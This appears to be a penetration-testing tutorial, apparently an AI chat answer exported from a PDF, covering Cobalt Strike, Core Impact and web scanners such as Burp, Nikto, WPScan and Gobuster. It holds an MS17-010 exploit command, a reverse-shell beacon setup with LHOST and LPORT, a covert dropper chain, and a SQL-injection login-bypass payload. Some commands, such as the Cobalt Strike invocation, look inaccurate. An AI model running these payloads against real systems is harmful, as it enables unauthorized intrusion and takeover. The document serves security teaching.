Red Teaming & Threat Simulation 
Integration with Metasploit & Cobalt Strike 
Usage 
1. Run a Penetration Test 
bash 
CopyEdit 
coreimpact-cli --target 192.168.1.100 --exploit ms17_010 
7. Cobalt Strike (Adversary Simulation & Post
Exploitation) 
Cobalt Strike is a red teaming tool used for command & control, lateral movement, and 
persistence. 
Key Features 
Beacon (Remote Access & C2 Communication) 
Payload Generation (DLL, EXE, PowerShell) 
Privilege Escalation & Persistence 
Integrates with Metasploit & Core Impact 
Usage 
1. Generate a Reverse Shell Payload 
bash 
CopyEdit 
./cobaltstrike.sh 
beacon.exe LHOST=192.168.1.200 LPORT=4444 
2. Deploy & Control Beacons 
bash 
CopyEdit 
beacon> shell whoami 
Example Attack: Deploying a Covert Beacon 
• Dropper Payload → Victim Executes → Full Remote Control. 
�
� Defensive Measures (How to Protect Against Exploits) 
Keep software & operating systems up to date 
Use firewalls & intrusion detection systems (IDS/IPS) 
Enforce strong authentication & access control 
Regularly audit & patch vulnerabilities 
Monitor logs for suspicious activities 
�
� Final Thoughts 
These exploitation tools are used by ethical hackers, penetration testers, and red 
teams to simulate real-world attacks. Mastering them is essential for cybersecurity 
professionals. 
Need a step-by-step penetration testing guide? Let me know!         
Web Application Assessment Tools & Examples 
Web application assessment involves identifying vulnerabilities in websites, web servers, 
and web applications. Here’s a breakdown of popular tools used for web security testing, 
along with examples of how they work. 
1. OWASP ZAP (Zed Attack Proxy) 
OWASP ZAP is a free web application security scanner used to detect vulnerabilities 
such as SQL Injection, XSS, and CSRF. 
Features: 
Passive & Active Scanning 
Automated Web Crawling 
Intercept & Modify HTTP Requests 
Fuzzing & Brute-Force Testing 
Example Usage: Scan a Website for Vulnerabilities 
bash 
CopyEdit 
zap-cli quick-scan http://target.com 
Result: Displays a list of vulnerabilities such as insecure cookies, outdated 
components, and XSS flaws. 
2. Burp Suite (Web Penetration Testing) 
Burp Suite is a web security testing tool that helps intercept, analyze, and modify HTTP 
traffic between the browser and a web application. 
Features: 
Intercept & Modify HTTP Requests 
Automated Scanning for SQLi, XSS, CSRF 
Intruder (Brute Force & Parameter Tampering) 
Repeater (Manual Payload Testing) 
Example Usage: Intercept a Login Request 
1. Set Burp Proxy to 127.0.0.1:8080. 
2. Capture a login request. 
3. Modify the username parameter:  
sql 
CopyEdit 
admin' OR '1'='1' -- 
4. Forward the request → Bypass authentication if vulnerable. 
Result: Exploits SQL Injection in login fields. 
3. Nikto (Web Server Vulnerability Scanner) 
Nikto is an open-source web server scanner that detects misconfigurations, outdated 
software, and known security vulnerabilities. 
Features: 
Identifies Apache, Nginx, IIS misconfigurations 
Detects exposed directories, old software, and dangerous files 
Finds insecure headers and SSL issues 
Example Usage: Scan a Web Server 
bash 
CopyEdit 
nikto -h http://target.com 
Result: Shows vulnerabilities like default admin pages, outdated server versions, 
and potential exploits. 
4. WPScan (WordPress Security Scanner) 
WPScan is a specialized tool for scanning WordPress websites for vulnerabilities, weak 
credentials, and outdated plugins. 
Features: 
Detects outdated WordPress versions 
Finds weak admin passwords (brute force) 
Scans for vulnerable themes & plugins 
Example Usage: Scan a WordPress Site 
bash 
CopyEdit 
wpscan --url http://target.com --enumerate u 
Result: Lists WordPress users, which can be targeted for brute-force attacks. 
5. Gobuster (Directory & Subdomain Bruteforcing) 
Gobuster is a tool for finding hidden directories and files on a web server using brute
force techniques. 
Features: 
Finds hidden files & directories (robots.txt, admin.php) 
Discovers subdomains 
Fast & efficient wordlist-based enumeration 
Example Usage: Find Hidden Directories 
bash 
CopyEdit 
gobuster dir -u http://target.com -w 
/usr/share/wordlists/dirb/common.txt 
Result: Identifies hidden directories like /admin, /backup, /uploads. 
6. AppSpider (Automated Web Application Security 
Scanner) 
AppSpider is a commercial web security scanner that detects OWASP Top 10 
vulnerabilities. 
Features: 
Automated scanning for SQLi, XSS, CSRF 
Identifies API security issues 
Reports detailed vulnerability findings 
Example Usage: Scan a Website 
bash 
CopyEdit 
appspider-cli --url http://target.com --scan 
Result: Generates a report listing security flaws and mitigation steps. 
�
� Summary Table of Tools 
Tool 
OWASP 
ZAP 
Purpose 
Web Vulnerability Scanner 
Example Usage 
zap-cli quick-scan 
http://target.com 
Burp 
Suite 
Nikto 
Manual Web Exploitation 
Web Server Scanning 
WPScan WordPress Security Testing 
Gobuster Directory & Subdomain 
Bruteforcing 
AppSpid
 er 
Automated Web Security 
Testing 
Modify login request for SQL Injection 
nikto -h http://target.com 
wpscan --url http://target.com -
enumerate u 
gobuster dir -u http://target.com -w wordlist.txt 
appspider-cli --url 
http://target.com --scan 
�
� Final Thoughts 
These tools are essential for web penetration testing. 
They help in identifying security weaknesses before attackers do. 
Always use them ethically & with proper authorization. 
Want a full guide on manual web hacking techniques? Let me know! 
